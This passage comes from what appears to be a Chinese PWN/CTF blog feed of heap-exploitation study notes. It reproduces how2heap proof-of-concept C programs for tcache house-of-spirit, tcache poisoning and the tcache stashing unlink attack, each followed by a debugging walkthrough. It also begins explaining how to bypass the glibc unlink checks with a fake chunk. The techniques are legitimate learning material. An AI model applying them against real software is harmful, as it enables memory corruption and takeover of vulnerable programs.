freed.\n&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;You can see this in malloc.c in function _int_free that tcache_put is called without checking if next chunk&#x27;s size and prev_inuse are sane.\n&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;(Search for strings \&quot;invalid next size\&quot; and \&quot;double free or corruption\&quot;)\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Ok. Let&#x27;s start with the example!.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Calling malloc() once so that it sets up its memory.\n&quot;</span>);</span><br><span class="line">        <span class="built_in">malloc</span>(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Let&#x27;s imagine we will overwrite 1 pointer to point to a fake chunk region.\n&quot;</span>);</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> *a; <span class="comment">//pointer that will be overwritten</span></span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> fake_chunks[<span class="number">10</span>]; <span class="comment">//fake chunk region</span></span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;This region contains one fake chunk. It&#x27;s size field is placed at %p\n&quot;</span>, &amp;fake_chunks[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;This chunk size has to be falling into the tcache category (chunk.size &lt;= 0x410; malloc arg &lt;= 0x408 on x64). The PREV_INUSE (lsb) bit is ignored by free     for tcache chunks, however the IS_MMAPPED (second lsb) and NON_MAIN_ARENA (third lsb) bits cause problems.\n&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;... note that this has to be the size of the next malloc request rounded to the internal size used by the malloc implementation. E.g. on x64, 0x30-0x38 w    ill all be rounded to 0x40, so they would work for the malloc parameter at the end. \n&quot;</span>);</span><br><span class="line">        fake_chunks[<span class="number">1</span>] = <span class="number">0x40</span>; <span class="comment">// this is the size</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Now we will overwrite our pointer with the address of the fake region inside the fake first chunk, %p.\n&quot;</span>, &amp;fake_chunks[<span class="number">1</span>]);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;... note that the memory address of the *region* associated with this chunk must be 16-byte aligned.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">        a = &amp;fake_chunks[<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Freeing the overwritten pointer.\n&quot;</span>);</span><br><span class="line">        <span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Now the next malloc will return the region of our fake chunk at %p, which will be %p!\n&quot;</span>, &amp;fake_chunks[<span class="number">1</span>], &amp;fake_chunks[<span class="number">2</span>]);</span><br><span class="line">        <span class="keyword">void</span> *b = <span class="built_in">malloc</span>(<span class="number">0x30</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;malloc(0x30): %p\n&quot;</span>, b);</span><br><span class="line"></span><br><span class="line">        assert((<span class="keyword">long</span>)b == (<span class="keyword">long</span>)&amp;fake_chunks[<span class="number">2</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="调试-3"><a href="#调试-3" class="headerlink" title="调试"></a>调试</h3><p>20 行，创建一个堆块进行 malloc 函数的初始化</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/how2heap/1639137267269969/787a795acd8c62a5febeeb8dade891f6b7c86671.png" alt="image-20211210195427076"></p><p>36 行，伪造了一个数组 fake_chunks，并将其 ‘size’ 位 设置成 0x40</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/how2heap/1639137398970495/ecb9fe4453634f06bce560dd42cfc3ce5a2320c3.png" alt="image-20211210195638799"></p><p>39 行，把这个 fake_chunks free 掉</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/how2heap/1639137445849418/932675325d138bc39ff92c5eaa98e2948a077ac1.png" alt="image-20211210195725669"></p><p>43 行，再次申请 0x30 大小的 chunk ，从 tcachebin 中取出 fake_chunks，并能够对其操作</p><h2 id="tcache-poisoning"><a href="#tcache-poisoning" class="headerlink" title="tcache_poisoning"></a>tcache_poisoning</h2><p>源码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt; </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="comment">// disable buffering</span></span><br><span class="line">        setbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>);</span><br><span class="line">        setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;This file demonstrates a simple tcache poisoning attack by tricking malloc into\n&quot;</span></span><br><span class="line">                   <span class="string">&quot;returning a pointer to an arbitrary location (in this case, the stack).\n&quot;</span></span><br><span class="line">                   <span class="string">&quot;The attack is very similar to fastbin corruption attack.\n&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;After the patch https://sourceware.org/git/?p=glibc.git;a=commit;h=77dc0d8643aa99c92bf671352b0a8adde705896f,\n&quot;</span></span><br><span class="line">                   <span class="string">&quot;We have to create and free one more chunk for padding before fd pointer hijacking.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">size_t</span> stack_var;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;The address we want malloc() to return is %p.\n&quot;</span>, (<span class="keyword">char</span> *)&amp;stack_var);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Allocating 2 buffers.\n&quot;</span>);</span><br><span class="line">        <span class="keyword">intptr_t</span> *a = <span class="built_in">malloc</span>(<span class="number">128</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;malloc(128): %p\n&quot;</span>, a);</span><br><span class="line">        <span class="keyword">intptr_t</span> *b = <span class="built_in">malloc</span>(<span class="number">128</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;malloc(128): %p\n&quot;</span>, b);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Freeing the buffers...\n&quot;</span>);</span><br><span class="line">        <span class="built_in">free</span>(a);</span><br><span class="line">        <span class="built_in">free</span>(b);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Now the tcache list has [ %p -&gt; %p ].\n&quot;</span>, b, a);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;We overwrite the first %lu bytes (fd/next pointer) of the data at %p\n&quot;</span></span><br><span class="line">                   <span class="string">&quot;to point to the location to control (%p).\n&quot;</span>, <span class="keyword">sizeof</span>(<span class="keyword">intptr_t</span>), b, &amp;stack_var);</span><br><span class="line">        b[<span class="number">0</span>] = (<span class="keyword">intptr_t</span>)&amp;stack_var;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Now the tcache list has [ %p -&gt; %p ].\n&quot;</span>, b, &amp;stack_var);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;1st malloc(128): %p\n&quot;</span>, <span class="built_in">malloc</span>(<span class="number">128</span>));</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Now the tcache list has [ %p ].\n&quot;</span>, &amp;stack_var);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">intptr_t</span> *c = <span class="built_in">malloc</span>(<span class="number">128</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;2nd malloc(128): %p\n&quot;</span>, c);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;We got the control\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">        assert((<span class="keyword">long</span>)&amp;stack_var == (<span class="keyword">long</span>)c);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="调试-4"><a href="#调试-4" class="headerlink" title="调试"></a>调试</h3><p>30 行，创建两个 chunk 并将其 free，链入 tcachebin</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/how2heap/1639138212747889/e894736baf3da1d4531962ff873e3850a27bd922.png" alt="image-20211210201012568"></p><p>36 行，将 330 的 chunk 的 fd 改为 stack_var，stack_var 链入 tcachebin</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/how2heap/1639138536542069/4f731c8ed58a40509f90029907c841b2aa08be18.png" alt="image-20211210201536354"></p><p>再次申请就可以申请到 stack_var 了</p><hr><p>要在 chunk 被 free 后改到 fd ，说明要能对 chunk 进行 写 操作，并且 chunk 本身指针没有被清空</p><h2 id="tcache-stashing-unlink-attack"><a href="#tcache-stashing-unlink-attack" class="headerlink" title="tcache_stashing_unlink_attack"></a>tcache_stashing_unlink_attack</h2><h3 id="源码-4"><a href="#源码-4" class="headerlink" title="源码"></a>源码</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//gcc -g tcache_stashing_unlink_attack.c -o tcache_stashing_unlink_attack_231</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> stack_var[<span class="number">0x10</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> *chunk_lis[<span class="number">0x10</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> *target;</span><br><span class="line"></span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;This file demonstrates the stashing unlink attack on tcache.\n\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;This poc has been tested on both glibc-2.27, glibc-2.29 and glibc-2.31.\n\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;This technique can be used when you are able to overwrite the victim-&gt;bk pointer. Besides, it&#x27;s necessary to alloc a chunk with calloc at least once. Last no    t least, we need a writable address to bypass check in glibc\n\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;The mechanism of putting smallbin into tcache in glibc gives us a chance to launch the attack.\n\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;This technique allows us to write a libc addr to wherever we want and create a fake chunk wherever we need. In this case we&#x27;ll create the chunk on the stack.    \n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// stack_var emulate the fake_chunk we want to alloc to</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Stack_var emulates the fake chunk we want to alloc to.\n\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;First let&#x27;s write a writeable address to fake_chunk-&gt;bk to bypass bck-&gt;fd = bin in glibc. Here we choose the address of stack_var[2] as the fake bk. Later we     can see *(fake_chunk-&gt;bk + 0x10) which is stack_var[4] will be a libc addr after attack.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    stack_var[<span class="number">3</span>] = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)(&amp;stack_var[<span class="number">2</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;You can see the value of fake_chunk-&gt;bk is:%p\n\n&quot;</span>,(<span class="keyword">void</span>*)stack_var[<span class="number">3</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Also, let&#x27;s see the initial value of stack_var[4]:%p\n\n&quot;</span>,(<span class="keyword">void</span>*)stack_var[<span class="number">4</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Now we alloc 9 chunks with malloc.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//now we malloc 9 chunks</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; <span class="number">9</span>;i++)&#123;</span><br><span class="line">        chunk_lis[i] = (<span class="keyword">unsigned</span> <span class="keyword">long</span>*)<span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//put 7 chunks into tcache</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Then we free 7 of them in order to put them into tcache. Carefully we didn&#x27;t free a serial of chunks like chunk2 to chunk9, because an unsorted bin next to a    nother will be merged into one after another malloc.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">3</span>;i &lt; <span class="number">9</span>;i++)&#123;</span><br><span class="line">        <span class="built_in">free</span>(chunk_lis[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;As you can see, chunk1 &amp; [chunk3,chunk8] are put into tcache bins while chunk0 and chunk2 will be put into unsorted bin.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//last tcache bin</span></span><br><span class="line">    <span class="built_in">free</span>(chunk_lis[<span class="number">1</span>]);</span><br><span class="line">    <span class="comment">//now they are put into unsorted bin</span></span><br><span class="line">    <span class="built_in">free</span>(chunk_lis[<span class="number">0</span>]);</span><br><span class="line">    <span class="built_in">free</span>(chunk_lis[<span class="number">2</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//convert into small bin</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Now we alloc a chunk larger than 0x90 to put chunk0 and chunk2 into small bin.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0xa0</span>);<span class="comment">// size &gt; 0x90</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//now 5 tcache bins</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Then we malloc two chunks to spare space for small bins. After that, we now have 5 tcache bins and 2 small bins\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Now we emulate a vulnerability that can overwrite the victim-&gt;bk pointer into fake_chunk addr: %p.\n\n&quot;</span>,(<span class="keyword">void</span>*)stack_var);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//change victim-&gt;bck</span></span><br><span class="line">    <span class="comment">/*VULNERABILITY*/</span></span><br><span class="line">    chunk_lis[<span class="number">2</span>][<span class="number">1</span>] = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)stack_var;</span><br><span class="line">    <span class="comment">/*VULNERABILITY*/</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//trigger the attack</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Finally we alloc a 0x90 chunk with calloc to trigger the attack. The small bin preiously freed will be returned to user, the other one and the fake_chunk wer    e linked into tcache bins.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">calloc</span>(<span class="number">1</span>,<span class="number">0x90</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Now our fake chunk has been put into tcache bin[0xa0] list. Its fd pointer now point to next free chunk: %p and the bck-&gt;fd has been changed into a libc addr    : %p\n\n&quot;</span>,(<span class="keyword">void</span>*)stack_var[<span class="number">2</span>],(<span class="keyword">void</span>*)stack_var[<span class="number">4</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//malloc and return our fake chunk on stack</span></span><br><span class="line">    target = <span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;As you can see, next malloc(0x90) will return the region our fake chunk: %p\n&quot;</span>,(<span class="keyword">void</span>*)target);</span><br><span class="line"></span><br><span class="line">    assert(target == &amp;stack_var[<span class="number">2</span>]);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="调试-5"><a href="#调试-5" class="headerlink" title="调试"></a>调试</h3><p>首先创建了两个数组，stack_var 和 chunk_lis，stack_var 将作为 fake_chunk 使用，chunk_lis 中会存放创建的堆块的 malloc 指针</p><p>24 行，将 stack_var[3] 的位置写上了 stack_var[2] 的地址，这里是为了后续将fake_chunk的bk指针指向一块可写的内存，绕过glibc在摘链表时候的检查</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/how2heap/1639140215146820/3884a53f294de2d01114062e6109969294165164.png" alt="image-20211210204334973"></p><p>42 行，申请了 9 个 chunk ，并将 chunk_3 ~ chunk_8 free 放入 tcachebin</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/how2heap/1639140336977544/58a7a38a3837f8f3b2741e685768ffc081a01c21.png" alt="image-20211210204536762"></p><p>48 行，依次 free 掉 chunk_1 、chunk_0 、chunk_2，注意下释放的顺序，因为 chunk_0 和 chunk_2 在物理地址上不相邻，所以放入 unsortedbin 时不会合并</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/how2heap/1639140507778734/380c18274d80409277cdd41166446ed5dbcfb054.png" alt="image-20211210204827593"></p><p>53 行，申请一个 0xb0 ( data 部分为 0xa0 )大小的堆块，由于遍历 tcache bin 后没有合适的大小的堆块，所以会接着遍历 unsorted bin，由于 chunk_0 与 chunk _2 地址不相邻，所以无法合并成大堆块进行拆分，所以最后会从 top_chunk 中新申请一个 0xb0 ( data 部分为 0xa0 )大小的堆块，并且将 unsorted bin 中的两个堆块，按照大小排列在 small bin 中 </p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/how2heap/1639140847766685/d03c26cca20d59a3288f620bf8b8cea43f1f029e.png" alt="image-20211210205407533"></p><p>59 行，申请两个 0x90 大小的 chunk ，从 tcachebin 中拿出之前 free 掉的 chunk_1 和 chunk_8</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/how2heap/1639141773724915/f3ce38cea03a2e830cea38d8c50108201717b938.png" alt="image-20211210210933546"></p><p>66 行，将 chunk_2 的 bk 位置覆盖成 stack_var 的地址，stack_var 链入 unsortedbin 挂在 chunk_2 前面</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/how2heap/1639142183070799/6836a3f671910ad1e6164bfd0f52d6e3c4988066.png" alt="image-20211210211622904"></p><p>71 行，用 calloc 申请一个 0x90 大小的 chunk，calloc 不会从 bin 中取堆块，它会直接在内存中取，此时 tcachebin 中只有 5 个 chunk，smallbin 中有两个 0xa0 大小的堆块 chunk_2 和 stack_var，因此这两个堆块会<strong>反着</strong>挂进 tcachebin</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/how2heap/1639142623907442/918ca30ac1831676d832a68d6e4f409b19849d2b.png" alt="image-20211210212343724"></p><p>这样当我们再次申请 0xa0 (data 为 0x90)的 chunk 时，就会把 stack_var 申请出来</p><hr><p>利用的是unlink与small bin向tcache bin中挂堆块的特点，需要注意的是unlink需要配置绕过条件，程序中必须要有calloc才能达到此效果</p><hr><p>参考博客</p><p>hollk 师傅的一系列博客</p>]]></content>
      
      
      <categories>
          
          <category> 堆利用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
            <tag> 堆 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>堆利用之unlink</title>
      <link href="/2021/12/08/%E5%A0%86%E5%88%A9%E7%94%A8%E4%B9%8Bunlink/"/>
      <url>/2021/12/08/%E5%A0%86%E5%88%A9%E7%94%A8%E4%B9%8Bunlink/</url>
      
        <content type="html"><![CDATA[<p>unlink 是一个宏操作，用于将某一个空闲 chunk 从其所处的<strong>双向链表</strong>中脱链。</p><p>glibc：2.27</p><h2 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//2.27 malloc.c line 1403</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> unlink(AV, P, BK, FD) &#123;  <span class="comment">// P:待脱链的空闲chunk的指针;BK:后一个chunk的指针;FD:前一个chunk的指针</span></span></span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), <span class="number">0</span>))<span class="comment">//检查物理相邻的下一位chunk的prev_size是否为等于待脱链的空闲chunk的size</span></span><br><span class="line">      malloc_printerr (<span class="string">&quot;corrupted size vs. prev_size&quot;</span>);      </span><br><span class="line">    FD = P-&gt;fd;      </span><br><span class="line">    BK = P-&gt;bk;      </span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="number">0</span>))      </span><br><span class="line">      malloc_printerr (<span class="string">&quot;corrupted double-linked list&quot;</span>);      </span><br><span class="line">    <span class="keyword">else</span> &#123;      </span><br><span class="line">        FD-&gt;bk = BK;      </span><br><span class="line">        BK-&gt;fd = FD;</span><br><span class="line">        <span class="comment">//以下为 largebin 操作</span></span><br><span class="line">        <span class="keyword">if</span> (!in_smallbin_range (chunksize_nomask (P))      </span><br><span class="line">            &amp;&amp; __builtin_expect (P-&gt;fd_nextsize != <span class="literal">NULL</span>, <span class="number">0</span>)) &#123;      </span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (P-&gt;fd_nextsize-&gt;bk_nextsize != P, <span class="number">0</span>)      </span><br><span class="line">|| __builtin_expect (P-&gt;bk_nextsize-&gt;fd_nextsize != P, <span class="number">0</span>))    </span><br><span class="line">      malloc_printerr (<span class="string">&quot;corrupted double-linked list (not small)&quot;</span>);   </span><br><span class="line">            <span class="keyword">if</span> (FD-&gt;fd_nextsize == <span class="literal">NULL</span>) &#123;</span><br><span class="line">            <span class="comment">/*如果 FD-&gt;fd_nextsize != NULL ，说明 FD 是下一组尺寸相同的 chunks 的第一个 chunk。</span></span><br><span class="line"><span class="comment">            如果 FD-&gt;fd_nextsize == NULL ，那么 P 脱链后 FD 即成为当前尺寸相同的 chunks 的第一个 chunk。*/</span></span><br><span class="line">                <span class="keyword">if</span> (P-&gt;fd_nextsize == P)<span class="comment">// 如果 P 为仅有的唯一一组尺寸相同的 chunks 的第一个 chunk</span></span><br><span class="line">                  FD-&gt;fd_nextsize = FD-&gt;bk_nextsize = FD;      </span><br><span class="line">                <span class="keyword">else</span> &#123;      </span><br><span class="line">                    FD-&gt;fd_nextsize = P-&gt;fd_nextsize;      </span><br><span class="line">                    FD-&gt;bk_nextsize = P-&gt;bk_nextsize;      </span><br><span class="line">                    P-&gt;fd_nextsize-&gt;bk_nextsize = FD;      </span><br><span class="line">                    P-&gt;bk_nextsize-&gt;fd_nextsize = FD;      </span><br><span class="line">                  &#125;      </span><br><span class="line">              &#125; <span class="keyword">else</span> &#123;      </span><br><span class="line">                P-&gt;fd_nextsize-&gt;bk_nextsize = P-&gt;bk_nextsize;      </span><br><span class="line">                P-&gt;bk_nextsize-&gt;fd_nextsize = P-&gt;fd_nextsize;      </span><br><span class="line">              &#125;      </span><br><span class="line">          &#125;      </span><br><span class="line">      &#125;      </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="绕过检查"><a href="#绕过检查" class="headerlink" title="绕过检查"></a>绕过检查</h3><p>大小检查过后会将 P 链入</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">FD = P-&gt;fd;    </span><br><span class="line">BK = P-&gt;bk;</span><br></pre></td></tr></table></figure><p>效果如图</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/unlink/1638940711922879/90829fe4cc0492ae8a7ed39b679c5770166048e8.png" alt="image-20211208131831689"></p><p>之后会有一个关键检查</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="number">0</span>))            </span><br><span class="line">      malloc_printerr (<span class="string">&quot;corrupted double-linked list&quot;</span>);</span><br></pre></td></tr></table></figure><p>绕过这个检查，构造 fake chunk</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">P-&gt;fd-&gt;bk == P &lt;=&gt; *(P-&gt;fd + <span class="number">0x18</span>) == P </span><br><span class="line">p-&gt;bk-&gt;fd == P &lt;=&gt; *(P-&gt;bk + <span class="number">0x10</span>) == P</span><br></pre></td></tr></table></figure><p>可以推出，如果要让<code>P-&gt;fd + 